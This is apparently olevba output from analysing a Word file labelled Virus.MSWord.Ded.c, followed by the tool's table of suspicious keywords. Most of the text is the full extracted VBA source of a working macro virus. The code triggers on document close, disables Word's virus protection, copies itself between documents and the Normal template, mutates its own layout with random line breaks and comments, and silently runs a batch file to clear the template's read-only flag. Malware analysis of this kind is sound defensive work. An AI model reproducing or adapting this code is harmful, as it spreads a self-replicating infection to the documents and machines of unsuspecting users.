olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.c-3c65b248b2f67c9f66e0f01291522eaa65dbed05
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.c-3c65b248b2f67c9f66e0f01291522eaa65dbed05 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 _
        Private Sub CommandButton1_Click()

       End Sub
'87.14458
 _
    Private Sub Document_Close()

 _
             On Error GoTo skam

 _
           Options.VirusProtection = unimplemented

 _
  SWL

             ABS99
'1.570392
skam:
'4.564917
              End Sub
'41.27668
 _
Private Sub SWL()

          If Not ActiveDocument. _
VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

 _
For i = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

 _
         d = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

            While Mid(d, _
Len(d) - 1, 2) = " _"

           i = i + _
1

  d = Left(d, Len(d) _
- 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
   Wend

          d = e(d)
'23.52822
 _
         ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d

 _
          End If

 _
         Next i

 _
   ActiveDocument.SaveAs AddToRecentFiles:=False

 _
       End If

 _
         End Sub

            Private _
Sub ABS99()

              If _
Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

 _
  f (NormalTemplate.FullName)

           For i _
= 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

 _
   d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
  If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

 _
          While Mid(d, Len(d) - 1, 2) = " _"

  i = i + 1
'6.585103
 _
       d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

          Wend
'4.811889
   d _
= e(d)

 NormalTemplate.VBProject. _
VBComponents(1).CodeModule.InsertLines i * 2, d

 _
       End If

 _
     Next i

 _
            NormalTemplate.Save

 _
End If

 _
          End Sub

  Private Function e(aString) As _
String

 _
     For i = 1 To Len(aString) - 1

         While Mid(aString, i, 2) = " "
'7.798058
 _
         aString = Left(aString, i) & Right(aString, Len(aString) - i - 1)

       Wend
'57.48649
 _
  If Mid(aString, i, 1) = "." Then

 _
           If Not Mid(aString, i - 1, 1) = Chr$(34) And Not Mid(aString, i + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

 _
           If Not Mid(aString, i + 1, 1) = Chr$(34) Then

 _
  e = Left(aString, i - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - i)

    For J _
= 1 To Int(15 * Rnd)

 _
        e = " " & e

 _
Next J

 _
     Exit Function

                   End If
'18.81318
            End If
'82.7899
 _
          Else

 _
    If Mid(aString, i, 1) = " " And Int(3 * Rnd) = 1 And i > 1 Then

 _
      If Not Mid(aString, i + 1, 1) = Chr$(34) And Not Mid(aString, i - 1, 1) = Chr$(34) Then

      e _
= Left(aString, i - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - i)

 _
        For J = 1 To Int(15 * Rnd)

 _
  e = " " & e

 _
  Next J

 _
      Exit Function

              End _
If

 _
     End If

     End If
'90.43737
 _
    Next i

 _
      e = aString & Chr$(13) & "'" & (100 * Rnd)

 _
                   Count = Int(15 * Rnd)

 _
For J = 1 To Count

 _
            e = " " & e

 _
  Next J

 _
 End Function

            Private Sub f(fName)
'43.16001
 _
If GetAttr(fName) And vbReadOnly Then

 _
Open Dir(fName) & ".bat" For Append As #1

              Print _
#1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

 _
        Print #1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

 _
   Close #1

 _
    shellResult = Shell(Dir(fName) & ".bat", vbHide)

 _
         End If

 _
      End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

